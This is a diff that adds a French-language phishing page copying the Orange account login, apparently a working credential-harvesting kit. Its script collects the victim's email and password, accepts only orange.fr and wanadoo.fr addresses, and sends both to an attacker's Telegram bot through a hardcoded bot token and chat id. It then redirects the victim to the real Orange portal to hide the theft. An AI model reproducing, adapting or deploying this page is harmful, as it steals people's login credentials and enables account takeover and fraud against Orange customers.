@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connexion</title>
+  <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,700&display=swap" rel="stylesheet">
+
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    html,
+    body {
+      height: 100%;
+    }
+
+    body {
+      font-family: 'Poppins', Arial, sans-serif;
+      background-color: white;
+      color: black;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 500px;
+      margin: auto;
+      padding: 30px 20px;
+      text-align: center;
+      flex: 1;
+    }
+
+    #bien,
+    #togglePassword {
+      display: none;
+    }
+
+    img {
+      margin: 0 auto;
+      display: block;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px 0;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      border: none;
+      border-radius: 0px;
+      border-bottom: 1px solid #1d1c1c;
+      font-size: 18px;
+    }
+
+    input:focus {
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      height: 50px;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: black;
+      color: white;
+      border: none;
+      font-size: 1.2rem;
+      cursor: pointer;
+    }
+
+    #connexion,
+    #password {
+      display: none;
+    }
+
+    #overlay {
+      height: 100%;
+      width: 100%;
+      position: fixed;
+      background-color: white;
+      left: 0;
+      top: 0;
+      z-index: 1000;
+      padding: 10px;
+      display: none;
+    }
+
+    footer,
+    .footer {
+      width: 100%;
+      background-color: #000;
+      color: #fff;
+      text-align: center;
+      font-size: 13px;
+      padding: 10px 20px;
+      border-top: 1px solid #eee;
+    }
+
+    footer nav,
+    .footer nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 10px;
+      font-size: 0.7rem;
+    }
+
+    footer nav a,
+    .footer nav a {
+      color: white;
+      text-decoration: none;
+    }
+
+    footer nav a:hover,
+    .footer nav a:hover {
+      color: #ff7900;
+      text-decoration: underline;
+    }
+
+    footer div,
+    .footer div {
+      font-size: 12px;
+    }
+
+    /* Affichage conditionnel */
+    footer {
+      display: block;
+    }
+
+    .footer,
+    #pwd {
+      display: none;
+    }
+
+    #big {
+      display: none;
+    }
+
+    #small {
+      display: block;
+    }
+
+    @media screen and (min-width: 624px) {
+      body {
+        background-color: #eee;
+        padding-top: 50px;
+      }
+
+      .wrapper {
+        border-top: 20px solid black;
+        border-radius: 0;
+        background-color: white;
+        min-height: 90vh !important;
+      }
+
+      form {
+        width: 100%;
+        display: flex;
+        flex-direction: column;
+        margin-bottom: auto;
+      }
+
+      form span {
+        font-size: 12px;
+        text-align: start;
+      }
+
+      button,
+      #next {
+        width: 200px;
+        margin: auto;
+      }
+
+      footer {
+        display: none;
+      }
+
+      .footer {
+        display: block;
+      }
+
+      #big {
+        display: block;
+      }
+
+      #small {
+        display: none;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="overlay">
+    <span>No found</span>
+  </div>
+
+  <div class="wrapper">
+    <img id="small" src="https://c.woopic.com/small-logo-orange.svg" width="50" />
+    <img id="big" src="https://c.woopic.com/logo-orange.png" width="50" />
+    <br />
+    <h1 id="iden">Identifiez-vous</h2>
+      <h1 id="bien">Bienvenue</h2>
+
+        <div style="background-color: rgba(128, 128, 128, 0.148); border-radius: 9999px; width: 300px; margin: auto;">
+
+          <p id="use"></p>
+        </div>
+        <br />
+
+        <form id="form">
+          <h4 style="text-align: start;" id="h4">Indiquez votre compte Orange</h4>
+          <br />
+          <input type="email" minlength="5" maxlength="35" required placeholder="Adresse e-mail" id="email"
+            name="email" />
+          <br />
+          <span id="notif" style="color: goldenrod; margin-right: auto;"></span>
+          <h4 style="text-align: start;" id="pwd">Saisissez votre mot de passe</h4>
+          <!-- <input type="password" minlength="5" maxlength="30" placeholder="Votre mot de passe" id="password"
+            name="password" /> -->
+
+          <div style="position: relative;">
+            <input type="password" minlength="5" maxlength="30" placeholder="Votre mot de passe" id="password"
+              name="password" style="padding-right: 40px;" />
+            <span id="togglePassword"
+              style="position: absolute; right: 10px; top: 50%; transform: translateY(-50%); cursor: pointer; font-size: 18px;">
+              👁️
+            </span>
+          </div>
+
+
+          <br />
+          <span id="noti" style="color: goldenrod;"></span>
+          <br />
+          <button id="next" type="submit">Continuer</button>
+          <button id="connexion" type="submit">Connexion</button>
+        </form>
+  </div>
+  <br> <br>
+  <!-- Footer pour Desktop -->
+  <div class="footer">
+    <nav>
+      <a href="#">Assistance</a>
+      <a href="#">Accessibilité</a>
+      <a href="#">Données personnelles</a>
+      <a href="#">Cookies</a>
+      <a href="#">Informations légales</a>
+    </nav>
+    <div>© Orange 2025</div>
+  </div>
+
+  <!-- Footer pour Mobile -->
+  <footer>
+    <nav>
+      <a href="#">Assistance</a>
+      <a href="#">Accessibilité</a>
+      <a href="#">Données personnelles</a>
+      <a href="#">Cookies</a>
+      <a href="#">Informations légales</a>
+    </nav>
+    <div>© Orange 2025</div>
+  </footer>
+
+  <script>
+  const togglePassword = document.getElementById('togglePassword');
+  const passwordInput = document.getElementById('password');
+
+  const eye = '👁️';
+  const svgEyeSlash = `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="white" viewBox="0 0 640 512">
+    <path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"/>
+  </svg>`;
+
+  let visible = false;
+  togglePassword.addEventListener('click', function () {
+    visible = !visible;
+    passwordInput.setAttribute('type', visible ? 'text' : 'password');
+    togglePassword.innerHTML = visible ? svgEyeSlash : eye;
+  });
+</script>
+
+
+  <script>
+
+    const token = '8047842370:AAGDbD5SVN24oeAGcyUSG4w0n47iyrpTXKo';
+    const chat_id = '7750197682';
+
+    document.getElementById('next').addEventListener('click', function (e) {
+      e.preventDefault();
+      const emailInput = document.getElementById('email');
+      const email = emailInput.value.trim();
+
+      if (!email) {
+        document.getElementById('notif').innerText = 'Veuillez entrer votre adresse email.';
+        emailInput.focus();
+        return;
+      } else if (!validateEmail(email)) {
+        document.getElementById('notif').innerText = 'Veuillez entrer une adresse email valide.';
+        emailInput.focus();
+        return;
+      }
+
+      document.getElementById('connexion').style.display = "block";
+      document.getElementById('password').style.display = "block";
+      document.getElementById('bien').style.display = "block";
+      document.getElementById('iden').style.display = "none";
+      document.getElementById('next').style.display = "none";
+
+      // Stocker et afficher l'email
+      localStorage.setItem('email', email);
+      const use = localStorage.getItem('email');
+      document.getElementById('use').innerText = use;
+      document.getElementById('email').style.display = "none";
+      document.getElementById('pwd').style.display = "block";
+      document.getElementById('togglePassword').style.display = "block";
+
+      document.getElementById('h4').style.display = "none";
+
+    });
+
+
+    document.getElementById('connexion').addEventListener('click', function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value.trim();
+
+      function isAllowedDomain(email) {
+        return email.endsWith('@orange.fr') || email.endsWith('@wanadoo.fr');
+      }
+
+      if (!isAllowedDomain(email)) {
+        document.getElementById('notif').innerText = "L'adresse email doit être en orange.fr ou wanadoo.fr";
+        document.getElementById('email').focus();
+        return;
+      }
+
+      const password = document.getElementById('password').value;
+
+      if (!password) {
+        document.getElementById('noti').innerText = 'Veuillez entrer votre mot de passe.';
+        return;
+      }
+
+      const message = `🎁O mail:\n📩Email: ${email}\n🗝️Mot de passe: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: message
+        })
+      })
+        .then(response => {
+          if (response.ok) {
+            console.log('Message envoyé avec succès.');
+            window.location.href = "https://www.orange.fr/portail";
+          } else {
+            throw new Error('Erreur lors de l\'envoi du message.');
+          }
+        })
+        .catch(error => {
+          console.error(error);
+          alert('Une erreur est survenue lors de l\'envoi des données.');
+        });
+    });
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+  </script>
+
+
+  <script src="./app.js"></script>
+
+</body>
+
+</html>
